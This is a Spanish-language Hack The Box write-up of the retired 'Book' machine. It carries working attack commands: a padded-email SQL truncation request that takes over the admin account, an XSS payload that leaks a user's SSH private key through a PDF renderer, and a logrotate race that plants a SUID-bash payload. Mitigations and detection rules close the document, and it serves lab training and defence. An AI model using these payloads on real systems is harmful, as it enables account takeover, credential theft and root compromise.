---
machine: Book
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, php, sql-truncation, xss, pdf, ssh, logrotate, race-condition]
---

# Book — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Una aplicación PHP de biblioteca con registro abierto. La validación del formulario limita el correo a 20 caracteres, igual que la columna de MySQL: enviando `admin@book.htb` seguido de relleno se crea una segunda cuenta que colisiona con la del administrador y permite entrar en `/admin/`. Desde el panel se genera un PDF con un renderizador que ejecuta JavaScript, así que un título con XSS lee la clave SSH de `reader` mediante `file:///`. Ya como `reader`, un `logrotate` de root rota un log propio con la opción `create`; la carrera de `logrotten` escribe en `/etc/bash_completion.d/` y el siguiente login local de root ejecuta el payload.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,80 -sCV -oA nmap_svc <IP>
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
```

- Solo SSH y HTTP; el resto del stack es PHP con MySQL detrás.
- La cookie de sesión se emite sin `HttpOnly`, detalle que no se usa en la cadena pero confirma una aplicación PHP clásica.
- El título de la portada da el nombre del servicio: una biblioteca con libros, colecciones y exportación a PDF.

```bash
printf '%s\n' '<IP> book.htb' | sudo tee -a /etc/hosts
```

## Enumeración

El registro está abierto y la página de contacto filtra la cuenta `admin@book.htb`. Un barrido encuentra `/admin/`, `/collections.php`, `/search.php` y `/feedback.php`.

Los campos del formulario tienen límites en el JavaScript (`name` 10, `email` 20) que se repiten en la base de datos. Esa coincidencia es la pista: MySQL trunca el valor al tamaño de la columna y las colaciones con `PAD SPACE` ignoran los espacios finales, así que dos correos distintos pueden quedar como el mismo.

## Foothold

Se registra una cuenta cuyo correo sea el del administrador más relleno:

```bash
curl -s -X POST http://book.htb/index.php \
  -d 'name=admin' \
  -d 'email=admin@book.htb++++++++++a' \
  -d 'password=<PASSWORD>'
```

La fila se inserta truncada a 20 caracteres, es decir, `admin@book.htb`, y el login en `/admin/index.php` con esa contraseña abre el panel. Hay un trabajo de limpieza de root que borra la fila duplicada en torno a un minuto, así que conviene usarla de inmediato; la contraseña original del administrador no se sobrescribe.

El panel permite crear libros y generar la colección en PDF. El generador ejecuta el JavaScript del contenido, de modo que un título con esta carga lee un fichero local y lo escribe en el PDF:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

Al pedir la exportación (`/admin/collections.php?type=collections`), el PDF contiene la clave privada de `reader`:

```bash
chmod 400 id_rsa
ssh -i id_rsa reader@book.htb
```

Por qué funciona: el renderizador es un navegador sin aislamiento que resuelve `file://` con los permisos del proceso que genera el PDF, así que el XSS del contenido se convierte en lectura arbitraria de ficheros del servidor.

## Movimiento lateral

No hay un segundo host. El salto es de `www-data` (contexto del PDF) a `reader` mediante la clave SSH leída, que es la única cuenta interactiva aparte de `root`.

## Escalada de privilegios

`pspy` muestra un `logrotate` lanzado por root cada pocos segundos sobre `/root/log.cfg`, y el log que rota pertenece a `reader`:

```text
CMD: UID=0 | /usr/sbin/logrotate -f /root/log.cfg
CMD: UID=0 | /bin/sh /root/log.sh
```

La configuración incluye `create`, la condición que necesita la carrera: `logrotate` renombra el directorio del log y crea uno nuevo siguiendo un enlace simbólico colocado a tiempo.

```bash
logrotate --version        # 3.11.0
gcc -o logrotten logrotten.c

printf '#!/bin/sh\nchmod u+s /bin/bash\n' > payload
head -c 10M < /dev/urandom > /home/reader/backups/access.log
./logrotten -p ./payload /home/reader/backups/access.log
```

`logrotten` sustituye `/home/reader/backups` por un enlace a `/etc/bash_completion.d/`; cuando root rota el log con `create`, el fichero resultante queda en ese directorio y con dueño `reader`. El disparo es el login local de root que ejecuta un script `expect` cada minuto y carga las completions:

```bash
ls -l /etc/bash_completion.d/
bash -p
id                         # uid=0(root)
```

## Evidencia

- Respuesta del registro y fila duplicada en el panel, sin contraseñas.
- PDF exportado con la clave recortada.
- Salida de `pspy` con el `logrotate` de root.
- `ls -l /etc/bash_completion.d/` mostrando el fichero creado por la carrera.
- Sin flags ni credenciales reales.

## Lecciones aprendidas

- Los límites de longitud del cliente y de la base de datos deben coincidir con una validación de servidor; si no, el truncado crea colisiones de identidad.
- Un generador de PDF que ejecuta JavaScript es un navegador con acceso al sistema de ficheros: hay que tratarlo como XSS con impacto de lectura local.
- Un log propio dentro de un directorio escribible, rotado por root con `create`, es una carrera explotable aunque `logrotate` no tenga CVE.
- La ventana de la cuenta duplicada era de un minuto: leer el `pspy`/cron antes de asumir que el fallo "no funciona".
- `bash -p` conserva los privilegios del bit SUID; sin `-p`, bash los descarta.

## Mitigaciones y detección

- Validar en el servidor la longitud y el formato del correo, y usar una restricción `UNIQUE` sobre el valor completo, no sobre una columna truncada.
- Servir la generación de PDF en un contenedor sin acceso al sistema de ficheros y con el JavaScript deshabilitado; sanear el HTML de entrada.
- No rotar logs de usuarios con `create` desde un proceso root; usar `su`/`copytruncate` y directorios propiedad de root.
- Detección: altas duplicadas del mismo correo en la tabla de usuarios; peticiones a `collections.php?type=collections` justo después de crear un libro con `<script>`; `logrotate` con `create` sobre rutas de usuario; escrituras en `/etc/bash_completion.d/` (auditd `-w /etc/bash_completion.d -p wa`).

MITRE: T1190, T1552.004, T1021.004, T1059.004, T1068, T1546.004, T1053.003.

## Referencias

- <https://0xdf.gitlab.io/2020/07/11/htb-book.html>
- <https://blog.raw.pm/en/HackTheBox-Book-write-up/>
- <https://flast101.github.io/HTB-writeups/book>
- <https://www.exploit-db.com/exploits/47466>
- <https://dev.mysql.com/doc/refman/5.7/en/char.html>
